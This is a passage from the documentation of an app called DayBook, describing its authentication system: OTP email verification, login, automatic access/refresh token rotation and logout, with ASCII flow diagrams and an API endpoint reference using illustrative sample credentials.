//   - 100,000 tries = ~2.7 hours for attacker
// 
// ✓ Rainbow tables
//   - Unique salt per password
//   - Cannot pre-compute tables
// 
// ✓ Brute-force
//   - Computational cost makes unfeasible
//   - Would need significant hardware/time
```

---

## Complete User Journey Diagrams

### Signup & OTP Verification Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      SIGNUP & OTP VERIFICATION FLOW                     │
└─────────────────────────────────────────────────────────────────────────┘

1. USER VISITS SIGNUP PAGE
   └─ frontend/src/pages/Signup.jsx loaded

2. USER FILLS FORM
   ├─ First Name: "John"
   ├─ Last Name: "Doe"
   ├─ Email: "john.doe@lpu.in"
   └─ Password: "SecurePass123!"

3. FRONTEND VALIDATES
   ├─ Email ends with @lpu.in? ✓
   ├─ Password: 8+ chars? ✓
   ├─ Has uppercase? ✓
   ├─ Has lowercase? ✓
   ├─ Has number? ✓
   └─ Has symbol? ✓

4. FORM SUBMISSION → POST /api/auth/signup
   │
   └─→ BACKEND PROCESSES
       ├─ Validate email format
       ├─ Check domain: @lpu.in
       ├─ Query: Does user exist?
       │  ├─ If yes & verified → Error "Already exists"
       │  ├─ If yes & unverified → Refresh OTP & update
       │  └─ If no → Create new user
       ├─ Generate 6-digit OTP (e.g., 427853)
       ├─ Hash with bcrypt: "$2b$10$..."
       ├─ Set expiry: now + 10 minutes
       └─ Send via Brevo SMTP

5. EMAIL RECEIVED
   └─ User sees: "Your OTP: 4 2 7 8 5 3"

6. USER ENTERS OTP → POST /api/auth/verify-otp
   │
   └─→ BACKEND VERIFIES
       ├─ Find user
       ├─ Check: already verified? (No)
       ├─ Check: OTP not expired? (Still valid)
       ├─ Compare: bcrypt.compare("427853", "$2b$10$...")
       ├─ Match? ✓ Yes!
       ├─ Set: isVerified = true
       ├─ Clear: otpHash, otpExpiry, otpSentAt
       ├─ Generate access token (15 min)
       ├─ Generate refresh token (7 days)
       └─ Set in cookies + return user data

7. FRONTEND PROCESSES RESPONSE
   ├─ Derive encryption key
   │  └─ PBKDF2-SHA256("SecurePass123!")
   ├─ Store in sessionStorage._db_ekey
   ├─ Update Redux: userInfo, setEncKey
   └─ Redirect to /dashboard

8. USER LOGGED IN & READY TO USE APP
   └─ Can create & read encrypted entries!
```

### Login Flow

```
┌──────────────────────────────────────────────────────────────────────┐
│                           LOGIN FLOW                                 │
└──────────────────────────────────────────────────────────────────────┘

1. USER VISITS LOGIN PAGE
   └─ frontend/src/pages/Login.jsx loaded

2. USER ENTERS CREDENTIALS
   ├─ Email: "john.doe@lpu.in"
   └─ Password: "SecurePass123!"

3. FORM SUBMISSION → POST /api/auth/login (Rate: 5/15min)
   │
   └─→ BACKEND VALIDATES
       ├─ Query user by email
       ├─ Found? If no → Error "Invalid credentials!"
       ├─ Verified? If no → Error "Verify email first"
       ├─ Password match? bcrypt.compare(...)
       ├─ Match? If no → Error "Invalid credentials!"
       ├─ If all checks pass:
       │  ├─ Issue access token (15 min)
       │  ├─ Issue refresh token (7 days)
       │  ├─ Delete old tokens (one device per user)
       │  └─ Set new tokens in cookies
       └─ Return success + user data

4. FRONTEND PROCESSES LOGIN
   ├─ Derive encryption key from password
   │  └─ Same password = same key
   ├─ Store key in sessionStorage
   ├─ Update Redux state
   └─ Redirect to /dashboard

5. USER LOGGED IN
   └─ Can access encrypted entries from before!
```

### API Request with Auto-Refresh Flow

```
┌────────────────────────────────────────────────────────────────────────┐
│              API REQUEST WITH AUTOMATIC TOKEN REFRESH                  │
└────────────────────────────────────────────────────────────────────────┘

SCENARIO A: Access Token Still Valid (< 15 min)
─────────────────────────────────────────────────

1. User requests: GET /api/entries
2. Browser sends: Cookie: token=eyJhbGc...; refreshToken=7f3e9a...
3. Backend authMiddleware:
   ├─ Verify token signature ✓
   ├─ Check expiry ✓
   ├─ Decode userId ✓
4. Request processes normally
5. Response: 200 OK + entries
6. User sees data instantly


SCENARIO B: Access Token Expired (> 15 min idle)
──────────────────────────────────────────────────

1. User requests: GET /api/entries
2. Backend authMiddleware:
   ├─ Verify signature: Invalid! (expired)
   └─ Return 401: { tokenExpired: true }

3. Frontend RTK Query intercepts:
   ├─ Status === 401? ✓
   ├─ tokenExpired === true? ✓
   ├─ Trigger refresh!

4. Mutex Check:
   ├─ refreshPromise exists?
   │  ├─ If yes → Wait for existing refresh
   │  └─ If no → Start new refresh
   
5. POST /api/auth/refresh:
   ├─ Browser sends refreshToken cookie
   ├─ Backend hashes it
   ├─ Query DB: Find matching token
   ├─ Valid? ✓
   ├─ Delete old token (rotation)
   ├─ Issue new access token
   ├─ Issue new refresh token
   └─ Set in new cookies

6. Frontend:
   ├─ All pending requests resume
   ├─ Retry original request with new token
   ├─ GET /api/entries (with new token)

7. Backend:
   ├─ Verify new token ✓
   ├─ Process request normally

8. Response: 200 OK + entries
9. User sees data (no interruption)


SCENARIO C: Refresh Token Expired (> 7 days)
──────────────────────────────────────────────

1. User requests: GET /api/entries
2. Backend: token expired, return 401 { tokenExpired: true }
3. Frontend triggers refresh: POST /api/auth/refresh
4. Backend:
   ├─ Hash refresh token
   ├─ Query DB: Not found! (expired/deleted)
   ├─ Return 401 Unauthorized

5. Frontend:
   ├─ Dispatch removeUserInfo() (clear Redux)
   ├─ clearKeyFromSession() (delete encryption key)
   ├─ Redirect to /login

6. User sees login page
   └─ Must authenticate again
```

### Logout Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│                        LOGOUT FLOW                                  │
└─────────────────────────────────────────────────────────────────────┘

1. USER CLICKS LOGOUT BUTTON
   └─ frontend/src/components/auth/Logout.jsx

2. FRONTEND → POST /api/auth/logout
   ├─ Browser sends: token + refreshToken cookies
   └─ Requires authMiddleware (user must be logged in)

3. BACKEND PROCESSES
   ├─ Extract refreshToken cookie
   ├─ Hash it: SHA256(refreshToken)
   ├─ Delete from DB:
   │  ├─ db.refreshTokens.findOne({ tokenHash })
   │  └─ deleteOne()
   ├─ Extra safety: Delete ALL user tokens
   │  └─ db.refreshTokens.deleteMany({ userId })
   ├─ Clear cookies:
   │  ├─ Set-Cookie: token=""; expires=Date(0)
   │  └─ Set-Cookie: refreshToken=""; expires=Date(0)
   └─ Return success

4. FRONTEND PROCESSES LOGOUT
   ├─ Dispatch removeUserInfo() → Redux state cleared
   ├─ clearKeyFromSession() → sessionStorage._db_ekey deleted
   ├─ Redirect to /login
   └─ User sees login form

5. IF USER TRIES TO ACCESS PROTECTED ROUTE
   ├─ No token cookie (cleared)
   ├─ No refreshToken cookie (cleared)
   ├─ Also: refresh token not in DB (deleted)
   └─ → Automatic redirect to /login

6. ALL SESSIONS ENDED
   └─ Complete logout (all devices if applicable)
```

---

## API Endpoints Reference

### Authentication Endpoints

#### 1. Sign Up
```
POST /api/auth/signup

Request:
{
  "firstName": "John",
  "lastName": "Doe",
  "email": "john.doe@lpu.in",
  "password": "SecurePass123!"
}

Response (200):
{
  "message": "Account created! Please check your email for the verification code.",
  "email": "john.doe@lpu.in"
}

Errors:
- 400: Invalid email format / Not @lpu.in domain
- 400: Invalid password (weak)
- 400: User already exists (verified)
```

#### 2. Verify OTP
```
POST /api/auth/verify-otp

Request:
{
  "email": "john.doe@lpu.in",
  "otp": "427853"
}

Response (200):
{
  "message": "Email verified successfully! Welcome to DayBook.",
  "data": {
    "_id": "507f1f77bcf86cd799439011",
    "email": "john.doe@lpu.in",
    "firstName": "John",
    "lastName": "Doe"
  }
}
// Tokens set in HttpOnly cookies

Errors:
- 400: OTP expired
- 400: Invalid OTP
- 400: Email already verified
```

#### 3. Resend OTP
```
POST /api/auth/resend-otp

Request:
{ "email": "john.doe@lpu.in" }

Response (200):
{ "message": "OTP sent successfully" }

Errors:
- 429: Rate limited (wait X seconds)
- 404: User not found
```

#### 4. Login
```
POST /api/auth/login
Rate Limit: 5/15 min per IP

Request:
{
  "email": "john.doe@lpu.in",
  "password": "SecurePass123!"
}

Response (200):
{
  "message": "User logged in successfully!",
  "data": {
    "_id": "507f1f77bcf86cd799439011",
    "email": "john.doe@lpu.in",
    "firstName": "John",
    "lastName": "Doe"
  }
}
// Tokens set in HttpOnly cookies

Errors:
- 401: Invalid credentials
- 403: Email not verified (requiresVerification: true)
```

#### 5. Refresh Token
```
POST /api/auth/refresh
Rate Limit: 20/5 min per IP

Request:
{ } (empty, uses refreshToken cookie)

Response (200):
{
  "message": "Token refreshed successfully",
  "data": { /* user data */ }
}
// New tokens set in cookies

Errors:
- 401: Refresh token expired
- 401: Refresh token not found
```

#### 6. Logout
```
POST /api/auth/logout
Auth Required: ✓ (authMiddleware)

Request:
{ } (empty)

Response (200):
{ "message": "Logged out successfully" }

Errors:
- 401: Not authenticated
```

---

## Conclusion

DayBook implements a **production-grade authentication system** with:

✅ **OTP-based Email Verification** - Two-factor auth via email
✅ **Dual-Token Architecture** - Short-lived access, long-lived refresh
✅ **Automatic Token Refresh** - Silent re-authentication for seamless UX
✅ **End-to-End Encryption** - Client-side AES-256-CBC with password-derived keys
✅ **Comprehensive Security** - Rate limiting, bcrypt hashing, httpOnly cookies, PBKDF2 key derivation
✅ **Secure Session Management** - One device per user, token rotation, TTL deletion

The system balances **security** (protection against attacks) with **user experience** (no forced re-logins, silent token refresh).

---

**Last Updated**: May 2026
**Version**: 1.0
